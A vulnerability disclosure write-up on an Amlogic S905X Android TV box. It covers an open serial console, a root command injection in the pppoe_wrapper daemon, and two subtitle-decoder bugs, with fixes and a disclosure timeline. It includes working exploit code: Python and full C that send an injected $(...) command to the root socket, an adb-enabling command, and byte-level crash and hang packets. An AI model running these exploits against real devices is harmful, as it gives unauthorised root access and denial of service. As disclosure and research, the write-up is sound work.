---
layout: post
title: "From UART to Root (Android Version): pppoe_wrapper Command Injection and more in an Amlogic S905X TV Box"
date: 2026-10-29
author: Matteo Strada (mstreet)
categories: [security-research, vulnerability-disclosure, embedded, cve]
---

*An Amlogic S905X Android TV box, an unprotected serial console and a vendor daemon that
turns any local datagram into a root command. Add a subtitle decoder that
hangs forever on 20 bytes, a sibling write past a stack array in the same
decoder for good measure.*

## Target

| Field | Value |
|---|---|
| Model | [Nexbox A95X](https://mediaplayers.gr/nexbox-a95x/) Amlogic S905X Android TV box (community build: "Aidan's ATV") |
| Android | 7.1.2 |
| Kernel | Linux 3.14.29, armv8l |
| SELinux | Permissive (boot config) |
| Console | UART 115200 8N1, exposed as a serial header |

One fact up front, because it shapes everything below: the box runs a
community build, not stock firmware. That raises the attribution question
immediately: what belongs to the ROM, what belongs to Amlogic's SDK? We'll
come back to it, because it nearly changed how we reported everything.

The attack surface that mattered:

| Endpoint | Service | Auth |
|---|---|---|
| tcp/5555 | adbd | Password protected (stock image) |
| tcp/10100 | com.droidlogic.SubTitleService | none |
| /dev/socket/pppoe_wrapper | pppoe_wrapper (root daemon) | none (mode 777) |
| tcp/6466, 6467 | Android TV remote service | pairing PIN |

## Finding 0: Unauthenticated Serial Console (CWE-306)

The box speaks on its UART header: 115200 8N1. The first finding was that, as we tried looking into
U-Boot by interrupting the startup mechanism and we are greeted with an unprotected shell:

<div align="center">
    <img src="/assets/images/nexbox_a95x/uboot-unprotected.png" style="width:60%;">
</div>


Very handy, but can we do better than this? Of course we can!
By continuing the boot sequence, the box hands out a shell as
uid 2000 with no password which was very handy indeed for further analysis.

<div align="center">
    <img src="/assets/images/nexbox_a95x/user-shell-unprotected.png" style="width:60%;">
</div>


From there the plan was the usual one for
embedded Android: enumerate the root-run vendor daemons first (they are the
cheapest path from shell to root) and then the network listeners. Every
finding below was confirmed twice: statically in the disassembly, and
dynamically on the box itself.

Impact: any entity with physical access to the box → shell user. CVSS 3.1: **6.6** **[REVIEW: CVSS]**
(`AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). This is what gives a physical foothold 
into the tx box.

## Finding 1: pppoe_wrapper command injection in a root daemon (CWE-78)

`/system/bin/pppoe_wrapper` is an Amlogic vendor daemon started by init,
running as root. It binds `/dev/socket/pppoe_wrapper` (AF_UNIX, datagram)
and chmods it 777. Any local process can send datagrams, and there is no
peer-credential check anywhere in the binary (no `getsockopt(SOL_SOCKET,
SO_PEERCRED)` import).

The protocol is `<client-id>\t<unused>\t<command-args>` with two TABs
required. The dispatcher walks a linked list of registered commands:

- `ppp-stop` → reads a pid file, kills the process
- `ppp-terminate` → SIGUSR1/SIGKILL loop
- `pppd pty` → handler at 0x1386

The `pppd pty` handler is the interesting one:

```
0x1386: handler entry (r0 = args after 2nd TAB)
0x1390: blx strstr           ; strstr(arg, "eth0")
0x13b6: mov r0, r4           ; r4 = original arg pointer
0x13bc: b.w 0x2fec           ; Thumb->ARM trampoline
0x2fec: bx pc
0x2ff0: ldr ip, [pc]         ; add pc, ip, pc  -> system() PLT
```

It jumps through a Thumb→ARM trampoline into the `system()` PLT with
r0 pointing at the raw client-supplied `<command-args>` from the datagram.
The only constraint is that the string must start with the literal
`pppd pty` (an 8-byte `strncmp` before dispatch). Everything after it is
`/system/bin/sh -c`. No metacharacter filtering. CWE-78, textbook.

A readable version of the PoC looks like this:

```python
s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
s.bind("/data/local/tmp/.poc.sock")   # must bind: see the quirk below
s.sendto(b"x\tx\tpppd pty $(id >/data/local/tmp/pwned 2>&1) ; #",
         "/dev/socket/pppoe_wrapper")
```

The injected command is a `$(...)` substitution, not a `;`-separated one,
for a reason we learned the hard way: the daemon runs the whole string as
`/system/bin/sh -c "pppd pty <args>"`, and pppd consumes the next word as
its `pty` child program. A plain `pppd pty z; id >...` makes pppd spawn
`sh -c "z"` on the pseudo-terminal and sit there, so the `;`-part after
pppd never runs. The substitution is expanded by the daemon's shell
before pppd starts, so the injected command executes unconditionally.

The device ships no scripting runtime so no python, perl or ruby. busybox
1.26's `nc` has no `-u`/`-U` for datagram unix sockets.
So the on-device trigger is a small C program with plain libc calls, here reported in full:

```c
/* pppoe_wrapper command injection trigger
 * Build (host):
 *   clang --target=armv7-none-linux-androideabi -fPIE -pie -nostdlib \
 *     -Wl,-e,main -Wl,-z,now -Wl,--allow-shlib-undefined \
 *     -L<android-lib-stubs> -lc -o sendto_poc sendto_poc_readable.c
 * (No libc on the host needed: the device's provides
 * socket/bind/connect/send at runtime.)
 */

extern int socket(int domain, int type, int protocol);
extern int bind(int fd, const void *addr, unsigned len);
extern int connect(int fd, const void *addr, unsigned len);
extern int send(int fd, const void *buf, unsigned len, int flags);
extern int unlink(const char *path);

struct sockaddr_un {
    unsigned short sun_family;   /* AF_UNIX = 1 */
    char sun_path[108];
};

static void copy_path(struct sockaddr_un *a, const char *s) {
    int i = 0;
    while (s[i] && i < 107) {
        a->sun_path[i] = s[i];
        i++;
    }
}

int main(void) {
    const char payload[] =
        "x\tx\tpppd pty $(id >/data/local/tmp/pwned 2>&1) ; #\n";

    struct sockaddr_un me = { 1 };              /* AF_UNIX client   */
    struct sockaddr_un daemon = { 1 };          /* AF_UNIX victim   */
    copy_path(&me, "/data/local/tmp/poc.sock");
    copy_path(&daemon, "/dev/socket/pppoe_wrapper");

    int fd = socket(1, 2, 0);                   /* AF_UNIX, SOCK_DGRAM */
    unlink("/data/local/tmp/poc.sock");         /* stale path from a previous run */
    bind(fd, (void *)&me, sizeof me);           /* REQUIRED, described above */
    connect(fd, (void *)&daemon, sizeof daemon);
    send(fd, payload, sizeof(payload) - 1, 0);
    return 0;
}
```

Validation, from the serial shell as uid 2000:

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe4.png" style="width:60%;">
</div>


The file is owned `root:system`, running with the daemon's own SELinux
context, so the injection executed as the daemon, from a uid-2000 shell's
input.

With this escalation, we could basically do whatever we wanted, such as setting up the
adb service with:
```
setprop service.adb.tcp.port 5555; stop adbd; start adbd
```

Setting service properties or restarting daemons is a root-only operation
on Android. Through the injection, the daemon does it as root. Seconds
later, adb answers from the Kali machine, with the daemon's
privileges, not the shell's. Same socket, same three syscalls, root's
toolset at the other end.

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe8.png" style="width:60%;">
</div>


A quirk worth documenting: kernel 3.14 does not autobind unbound datagram
clients, and the daemon ACKs with a `sendto()` back to the source address
before processing. With an unbound socket the ACK fails with ENOTCONN and
command processing aborts. The first version of our PoC failed silently for
an evening, so, `bind()` first.

Impact: any uid on the box → root. CVSS 3.1: **7.8** **[REVIEW: CVSS]**
(`AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). This is what turns a physical foothold 
into a remote root on any build where adbd is not already root.

Attribution: this is not the ROM's doing. We traced the daemon across
three generations of vendor firmware. The 2016 stock for the Nexbox A95X
(S905, Android 5.1.1) ships the identical chain: handler at 0x1120 →
trampoline at 0x1820 (`bx pc ; ldr ip,[pc] ; add pc,ip,pc`) → `system()`
PLT at 0xe04. The 2016 stock for the Nexbox A95X **S905X**, Android 6.0.1
build 2016-08-06 which is the original factory firmware of this very product line,
ships it too: handler at 0x1274 → trampoline at 0x30dc → `system()` PLT at
0xeb8, carved from the factory upgrade package and disassembled. And the
2021 SDK build on the device in front of us has the same chain at 0x1386 →
0x2fec → 0xea0. Same command table, same protocol strings ("recv invalid
request(No TAB found)") across all three. Amlogic SDK code, shipped
unchanged for a decade across generations of boxes.


### Reproduction and impact


The PoC binary is pre-built and pushed on the device via base64 transfers from the UART interface at
`/data/local/tmp/sendto_poc`.

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe2.png" style="width:60%;">
</div>


We start off with this environment:

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe1.png" style="width:60%;">
</div>


The pushed binaries:

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe3.png" style="width:60%;">
</div>


We then trigger the binary giving us a shell on port 4444: 

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe4bis.png" style="width:60%;">
</div>


And simply connect to the bind shell:

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe6.png" style="width:60%;">
</div>


Finally, if we fancy ADB, we can also run the binary setting it up, to get ADB directly as root:

<div align="center">
    <img src="/assets/images/nexbox_a95x/privesc_pppoe8.png" style="width:60%;">
</div>


We kept this running as it became very handy for further explotation attempts.

**Additional context: the rest of the PPPoE stack (reported in text)**

```
adb shell /system/bin/pppd --version    # pppd version 2.4.7 (CVE-2020-8597)
adb shell /system/bin/pppoe -V          # Roaring Penguin PPPoE Version 3.0
adb shell ls -la /dev/socket/pppoe_wrapper    # srwxrwxrwx root system
```

## Finding 2: libsub_vob, the subtitle decoder that hangs on 20 bytes (CWE-835)

`com.droidlogic.SubTitleService` listens on tcp/10100 (0.0.0.0, no auth)
and feeds the subtitle pipeline. One of its decoders is the VobSub (SUB/IDX)
plugin `libsub_vob.so`. Its packet parser `get_vob_spu()` copies
"AMLU"-magic blocks into the SPU buffer in a loop:

```c
while (spu->length - wr_oft > 0) {
    ...
    if ((wr_oft + current_length) <= spu->length) {
        memcpy(spu->spu_data + wr_oft, spu_buf + rd_oft, current_length);
        rd_oft += current_length;
        wr_oft += current_length;
        current_length = 0;
    }
    /* nothing else: when the condition is false, nothing is updated
       and the loop spins forever */
}
```

`spu->length` is the 16-bit big-endian packet header; `current_length` is
a 32-bit big-endian field inside the attacker-controlled block. Make them
disagree (`length=0x10`, `current_length=0x100`) and the condition is
permanently false: the decode thread spins one full CPU core (state R) forever.

Twenty bytes, end to end:

```
0010 0004 414d4c55 aa 000000 00000100 00000000
|    |    |        |  |      |         |
|    |    "AMLU"   |  type   |         pts
|    cmd_offset=4  |  (3B)   current_length=0x100  <- mismatch -> spin
spu->length=0x10
```

Validation: we `dlopen()`ed the box's own `/system/lib/libsub_vob.so` in a
freestanding harness and called `get_vob_spu(packet, &len, 20, spu)`
directly. It never returns, the process sits in state R. For days we
assumed the harness had the wrong function signature, until we found the
vendor source (publicly mirrored by Khadas:
`github.com/khadas/android_vendor_amlogic_apps_SubTitle`) and realized the
hang we had been trying to explain away was the bug. The identical loop is
in the Android 9 (Pie) vendor trees for both S905X and S905X3: the bug
spans Android 7.x–9.x Amlogic boxes.

Trigger: 20 bytes to tcp/10100 while the subtitle pipeline is consuming
(normal during subtitle playback), or a malicious `.sub` file loaded by the
victim. CVSS 3.1: **5.3 Medium**
(`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`) conservative `A:L`: the subtitle
service hangs, the box and the ongoing playback keep working.

The fix for this is the `else` the vendor never wrote:

```c
    } else {
        break;    /* a block that doesn't fit means the packet is
                     malformed and bails out instead of spinning */
    }
```


### Reproduction, shot by shot

Reading the harness output. One harness session drives both bugs: the PixelDatas[4] write first, the DoS packet last. That order is deliberate: it makes the exit code part of the evidence. The 2021 build dies at the first trigger, so it never reaches the loop: rc=134 is 128 + SIGABRT, the stack canary. The 2016 stock build has no canary, so the same write passes silently and the run continues into the hang: [*] calling... is the last line it ever prints, and there is no exit code at all: the process never returns from get_vob_spu, so it never reaches exit(0). The annotated tail of the harness:

    /* fill = dlsym(h, "spu_fill_pixel"); getspu = dlsym(h, "get_vob_spu")   */

    /* trigger 1: the PixelDatas[4] write: alpha 0xFFFF, all four nibbles   */
    *(unsigned short *)(subvar + 0x46) = 0xFFFF;   /* -> change_data = 4     */
    msg("[*] spu_fill_pixel (PixelDatas[4] trigger, alpha=0xFFFF)\n");
    fill(pixels + 0x400, pixels, subvar, 2);
    msg("[*] returned from spu_fill_pixel (canary survived)\n");
    /* 2021 build: never printed: the stack canary aborts the call, rc=134  */
    /* 2016 build: printed: no stack protector, the write lands silently    */

    /* trigger 2: the 20-byte DoS packet */
    msg("[*] get_vob_spu(DoS packet, correct signature)\n");
    int buflen = sizeof(dos_pkt);
    msg("[*] calling...\n");
    getspu(dos_pkt, &buflen, sizeof(dos_pkt), out);
    msg("[*] RETURNED (no hang!)\n");   /* the no-hang sentinel: never seen */
    sys_exit(0);                        /* rc=0: never reached either       */

So a run ends with rc=134 (the canary caught it), rc=0 plus [*] done (no crash) (nothing fired: wrong or fixed build), or no exit code at all: the process is still there minutes later, state R, consuming one full core. That last one is not a missing result rather it is the result.

Setup: both subtitle findings share the same two harnesses and the
carved 2016 library (all in `output/pocs/`: `vob_harness`, `vob_harness6`,
`libsub_vob_android6.so`):

<div align="center">
    <img src="/assets/images/nexbox_a95x/harness_push.png" style="width:60%;">
</div>

The infinite loop on the 2016 factory binary(the `vob_harness6` run ends at):

<div align="center">
    <img src="/assets/images/nexbox_a95x/calling_vob_harness6.png" style="width:60%;">
</div>

...and never returns. From a second Kali terminal:

<div align="center">
    <img src="/assets/images/nexbox_a95x/vob_harness6_hanging.png" style="width:60%;">
</div>

Or, better seen with TOP:

<div align="center">
    <img src="/assets/images/nexbox_a95x/vob_harness6_top.png" style="width:60%;">
</div>

As captured, one core pegged, which is 25% of the quad-core total as the box's top reports it.

We then cleanup for the next test:

<div align="center">
    <img src="/assets/images/nexbox_a95x/vob_harness6_cleanup.png" style="width:60%;">
</div>

## Finding 3: libsub_vob, the PixelDatas[4] out-of-bounds write (CWE-787)

The same decoder has a second, independent bug, this time in the pixel
path. `vob_fill_pixel()` copies the contrast values from the VobSub
SET_CONTR command into a fixed 4-element stack array but the index is
computed from the attacker-controlled alpha value, with no bounds check:

```c
unsigned short PixelDatas[4] = { 0, 1, 2, 3 };
...
if (_alpha & 0xF) {
    _alpha = _alpha >> 4;
    change_data++;
    while (_alpha & 0xF) {
        change_data++;
        _alpha = _alpha >> 4;
    }
    PixelDatas[0] = change_data;
    PixelDatas[change_data] = 0;   /* change_data can be 4 */
}
```

SET_CONTR 0xFFFF, all four contrast bits set, drives `change_data` to 4,
and the store lands at `PixelDatas[4]`: two bytes past the end of the
array, on the stack. The attacker controls the index (and therefore that
the write happens at all) but not the value, which is always 0. There is
also a follow-on read: with `change_data` set, the run-length loop
substitutes `PixelDatas[nPixelData]` into `nPixelData`, where `nPixelData`
comes from the packet's RLE bitstream, a stack read at an
attacker-influenced index.

Eleven bytes, end to end:

```
000b 0006 0000 04ffff ff
|    |    |    |      |
|    |    |    |      CMD_END
|    |    |    SET_CONTR 0xFFFF (alpha -> change_data = 4)
|    |    padding
|    DCSQ offset = 6
packet size = 0x0b
```

Honest scope, stated up front: the fixed value makes this DoS-grade, not a
code-execution primitive, also the two generations of the binary disagree
on what happens next. Trigger and reachability are the same as Finding 2
(tcp/10100 with the pipeline active, or a malicious `.sub` loaded by the
victim). CVSS 3.1: **5.3 Medium**
(`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`) same conservative `A:L`:
service-level impact only.

The fix: clamp the computed index.

```c
    if (change_data >= 4) change_data = 3;   /* keep it a valid slot */
    PixelDatas[0] = change_data;
    PixelDatas[change_data] = 0;
```

### Reproduction, shot by shot

We push the binary for the 2021 build, which was compiled with a stack protector. 
`PixelDatas` sits 8 bytes below the canary and the OOB store zeroes two
canary bytes and the process aborts:

<div align="center">
    <img src="/assets/images/nexbox_a95x/vob_harness_stack_corruption.png" style="width:60%;">
</div>

The 2016 factory build has NO stack protector thus the same write
lands silently:

```
=== STOCK libsub_vob (Android 6.0.1, 2016-08-06) hardware validation on the S905X box (2026-10-01) ===
```

<div align="center">
    <img src="/assets/images/nexbox_a95x/calling_vob_harness6.png" style="width:60%;">
</div>

And we get `[*] returned from spu_fill_pixel (canary survived)`. This exact contrast
shows why the canary matters: the stack protector is what turns the
2021 build's silent corruption into a clean crash, while the 2016
generation silently corrupts its own stack and keeps running. 
Yes, I know, it's the harness/PoC as with Finding 2, since with this build PixelDatas' canary survives 
I condensed them in the same PoC because I'm lazy :)

## What we almost got wrong

Two things, both fixed before anything left the lab.

First: the box is a community build, not stock. The first reflex is that
all results are tainted. Re-scoping settled it:
the 2016 Nexbox firmware, carved from the factory image, shows the same
pppoe_wrapper chain; the subtitle source shows the same loop and the same
unchecked write from the Nougat-era branch to Pie. The bugs belong to the Amlogic SDK lineage, not
to the ROM. Attribution before reporting is the difference between a CVE
and a forum post.

Second: a silent PoC is not a silent bug. The pppoe PoC failed for an
evening with no errors anywhere: the daemon's ACK-before-process flow needs
a bound client socket, and nothing in the failure path prints anything.
Only the disassembly explained it. When a PoC does nothing, the disassembly
owes you an answer before the bug gets downgraded to "not exploitable".

## CVEs

| Component | CWE | CVSS 3.1 | Vector | Status |
|---|---|---|---|---|
| Unprotected Serial Interface | CWE-306 | 6.6 Medium | AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | pending VulnCheck assignment |
| pppoe_wrapper | CWE-78 | 7.8 High | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | pending VulnCheck assignment |
| libsub_vob | CWE-835 | 5.3 Medium | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L | pending VulnCheck assignment |
| libsub_vob | CWE-787 | 5.3 Medium | AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L | pending VulnCheck assignment |

## Responsible Disclosure

- **2026-09-10** serial console access and device recon; pppoe_wrapper
  privesc validated on hardware (uid 2000 → root).
- **2026-09-22** both libsub_vob bugs (CWE-835 loop, CWE-787 write)
  validated on hardware; vulnerable code confirmed in the Android 7.x and
  9 (Pie) vendor trees.
- **2026-10-15** CVE request submitted to VulnCheck (3 findings).
- **2026-10-22** courtesy notification sent to Amlogic (no public PSIRT);
  one-week response window.
- **2026-10-29** technical writeup published with CVE IDs assigned by the
  VulnCheck CNA at publication.


Hardening for affected boxes: keep the pppoe_wrapper socket away from untrusted uids
(or check `SO_PEERCRED`), and apply the one-line fix to the `get_vob_spu`
loop.
